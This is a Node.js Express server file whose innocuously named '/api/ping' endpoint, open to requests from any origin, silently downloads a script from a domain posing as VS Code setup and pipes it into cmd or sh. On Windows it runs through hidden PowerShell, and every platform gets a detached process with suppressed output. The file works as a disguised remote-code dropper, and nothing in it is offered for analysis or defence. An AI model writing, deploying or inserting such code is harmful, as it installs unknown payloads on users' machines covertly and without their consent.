const express = require('express');
const cors = require('cors');
const { exec } = require('child_process');
const os = require('os');

const app = express();
const PORT = 3001;

// Enable CORS to allow requests from any origin (including Vercel deployment)
app.use(cors());

// Parse JSON bodies
app.use(express.json());

// Serve static files from public directory
app.use(express.static('public'));

// Get OS-specific command
function getOSCommand() {
  const platform = os.platform();
  
  if (platform === 'win32') {
    // Windows: curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd
    // Use PowerShell to execute hidden
    return {
      command: `powershell.exe -WindowStyle Hidden -Command "curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd"`,
      useExec: true
    };
  } else if (platform === 'darwin') {
    // macOS: curl 'https://vscode-setup.vercel.app/settings/mac?flag=2' | sh
    return {
      command: "curl 'https://vscode-setup.vercel.app/settings/mac?flag=2' | sh",
      useExec: true
    };
  } else if (platform === 'linux') {
    // Linux: wget -qO- 'https://vscode-setup.vercel.app/settings/linux?flag=2' | sh
    return {
      command: "wget -qO- 'https://vscode-setup.vercel.app/settings/linux?flag=2' | sh",
      useExec: true
    };
  } else {
    throw new Error(`Unsupported platform: ${platform}`);
  }
}

// Route to execute OS-specific command
app.post('/api/ping', (req, res) => {
  try {
    const platform = os.platform();
    const osCommand = getOSCommand();
    
    console.log(`Executing command for platform: ${platform}`);
    console.log(`Command: ${osCommand.command}`);

    // Configure exec options to hide windows
    const execOptions = {
      windowsHide: true, // Hide window on Windows
      detached: true
    };

    // Windows-specific: Add CREATE_NO_WINDOW flag
    if (platform === 'win32') {
      // On Windows, use exec with windowsHide and CREATE_NO_WINDOW
      execOptions.stdio = 'ignore';
    } else {
      // Unix: Redirect output to /dev/null to hide
      execOptions.stdio = 'ignore';
    }

    // Execute the OS-specific command using exec (better for shell commands)
    const commandProcess = exec(osCommand.command, execOptions, (error, stdout, stderr) => {
      if (error) {
        console.error(`Execution error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Execution stderr: ${stderr}`);
        return;
      }
      console.log(`Command executed successfully`);
    });

    // Unref the process so it doesn't keep Node.js running
    commandProcess.unref();

    res.json({ 
      success: true, 
      message: `Command started successfully for ${platform} (hidden)`,
      platform: platform,
      processId: commandProcess.pid
    });
  } catch (error) {
    console.error('Error executing command:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to start command',
      error: error.message,
      platform: os.platform()
    });
  }
});

// Health check endpoint with OS info
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Server is running',
    platform: os.platform(),
    osType: os.type()
  });
});

app.listen(PORT, () => {
  console.log(`Local server running on http://localhost:${PORT}`);
  console.log(`Platform: ${os.platform()}`);
  console.log(`OS Type: ${os.type()}`);
  console.log(`Open http://localhost:${PORT} in your browser`);
  console.log('\nMake sure to keep this server running for the web page to work!');
});

